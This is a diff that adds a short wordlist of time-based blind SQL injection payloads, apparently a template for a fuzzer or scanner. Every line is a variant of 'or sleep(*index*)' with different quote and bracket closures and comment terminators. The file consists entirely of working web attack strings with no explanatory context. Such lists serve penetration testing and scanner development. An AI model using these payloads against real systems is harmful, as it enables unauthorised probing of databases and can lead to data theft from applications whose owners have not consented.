@@ -1,0 +1,17 @@
+sleep(*index*)%23
+1 or sleep(*index*)%23
+" or sleep(*index*)%23
+' or sleep(*index*)%23
+sleep(*index*)-- 
+1 or sleep(*index*)-- 
+" or sleep(*index*)-- 
+' or sleep(*index*)-- 
+" or sleep(*index*)="
+' or sleep(*index*)='
+1) or sleep(*index*)-- 
+") or sleep(*index*)="
+') or sleep(*index*)='
+1)) or sleep(*index*)%23
+1)) or sleep(*index*)-- 
+")) or sleep(*index*)="
+')) or sleep(*index*)='
